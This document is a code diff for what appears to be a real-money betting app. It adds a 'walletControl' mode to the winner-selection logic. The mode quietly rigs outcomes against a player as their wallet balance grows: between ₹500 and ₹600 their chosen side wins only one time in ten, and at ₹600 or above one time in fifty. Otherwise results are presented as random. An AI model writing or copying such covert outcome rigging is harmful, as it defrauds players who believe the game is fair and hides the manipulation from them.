@@ -518,6 +518,15 @@ const UserPanel = () => {
     return winner;
   };
 
+  const getMyWalletBalance = async () => {
+  if (!user) return 0;
+  const snap = await getDocs(
+    query(collection(db, "users"), where("__name__", "==", user.uid))
+  );
+  return snap.empty ? 0 : snap.docs[0].data().walletBalance || 0;
+};
+
+
   // SUPER ADVANCED WINNER SELECTOR BASED ON MODE
   const chooseWinnerByMode = async (mode) => {
     // Load current bets
@@ -538,6 +547,40 @@ const UserPanel = () => {
     const seed = (sys ^ time ^ (team1Amount * 29) ^ (team2Amount * 37)) >>> 0;
 
     const randomTeam = seed % 2 === 0 ? 1 : 2;
+
+    /* ----------------------------
+    0️⃣ WALLET CONTROL MODE
+    → Soft cap near ₹600
+---------------------------- */
+if (mode === "walletControl") {
+  const myBal = walletBalance; // realtime state
+
+  // random fallback
+  const randomTeam = seed % 2 === 0 ? 1 : 2;
+
+  // अगर user ने bet ही नहीं किया
+  if (myEntries.length === 0) {
+    return randomTeam;
+  }
+
+  const myCart = myEntries[0].cartId;
+
+  // 🎯 SOFT CAP ZONE
+  if (myBal >= 500 && myBal < 600) {
+    // सिर्फ 1/10 chance win
+    return seed % 10 === 0 ? myCart : (myCart === 1 ? 2 : 1);
+  }
+
+  // 🚫 HARD BLOCK ZONE
+  if (myBal >= 600) {
+    // सिर्फ 1/50 chance win
+    return seed % 50 === 0 ? myCart : (myCart === 1 ? 2 : 1);
+  }
+
+  // normal play if below 500
+  return randomTeam;
+}
+
 
     /* ----------------------------
           1️⃣ BALANCED MODE  
